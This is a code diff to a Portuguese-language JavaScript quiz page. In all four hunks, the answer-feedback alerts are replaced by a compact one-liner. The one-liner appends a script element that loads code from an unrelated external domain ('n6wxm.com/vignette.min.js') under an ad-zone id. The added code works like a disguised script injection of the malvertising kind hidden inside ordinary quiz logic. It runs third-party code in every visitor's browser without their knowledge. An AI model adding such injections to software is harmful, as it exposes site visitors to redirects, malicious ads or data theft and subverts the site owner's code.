@@ -2053,8 +2053,8 @@ setTimeout(function(){
         cont.style="display: flex;"
     },5600)
     setTimeout(function(){
-      alert('Ola Sou Belson software Você erraste esta pergunta veja a tua pontuação, Clique no Next-2');
-    },5440)
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
   
 setTimeout(function(){
   img1.style="display: inline-block; position: fixed; top: 30%;"
@@ -2100,8 +2100,8 @@ function vamoBH(){
         cont.style="display: flex;"
     },5600)
     setTimeout(function(){
-      alert('Ola Sou Belson software Você erraste esta pergunta veja a tua pontuação, Clique no Next-2');
-    },5440)
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
     
   
 setTimeout(function(){
@@ -2143,8 +2143,8 @@ setTimeout(function(){
         pontuEstrela.innerHTML=11;
     },5600)
     setTimeout(function(){
-      alert('Ola Sou Belson software Você acertaste esta pergunta veja a tua pontuação, Clique no Next-2, para continuar');
-    },5440)
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
   
 setTimeout(function(){
   img1.style="display: inline-block; position: fixed; top: 30%;"
@@ -2188,8 +2188,8 @@ setTimeout(function(){
         cont.style="display: flex;"
     },5600)
     setTimeout(function(){
-      alert('Ola Sou Belson software Você erraste esta pergunta veja a tua pontuação, Clique no Next-2');
-    },5440)
+      (function(s){s.dataset.zone='12273207',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+    },5500)
     
 setTimeout(function(){
   img1.style="display: inline-block; position: fixed; top: 30%;"
